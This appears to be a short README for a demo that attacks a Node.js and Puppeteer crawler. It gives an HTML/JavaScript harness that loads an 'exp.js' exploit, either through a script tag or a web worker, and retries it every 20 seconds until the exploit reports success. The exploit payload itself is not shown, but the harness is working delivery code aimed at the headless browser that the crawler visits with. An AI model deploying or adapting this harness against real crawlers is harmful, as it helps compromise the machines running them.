# Demo2 


Nodejs + Puppeteer : crawler

## deps


Nodejs && Puppeteer
## add exp.js


- add with `<script src=xxxxx>`

OR

- add with js code, work with js web worker



```javascript
<!-- add you exploit js here-->


<!-- <script src="http://127.0.0.1/exp.js"></script> -->

<script> 
var worker;
var exploitSucc = false;

function startExploit() {
    if(exploitSucc){
        return;
    }
    worker = new Worker('exp.js');
 
    worker.onmessage = function (e) {
        exploitSucc = e.data;
        if (exploitSucc == false) {
            document.write("exploit failed, retry....<hr>");
            return;
        }
        document.write("exploit done!!!!!<hr>");
    }
}

// setTimeout(startExploit(), 1000);
startExploit();

var hangMonitor = setInterval(function () {
    if (exploitSucc == true) {
        clearInterval(hangMonitor);
    } else {
        startExploit();
    }
}, 20000);
</script>

<!-- done -->
```

NOT perfect :( 

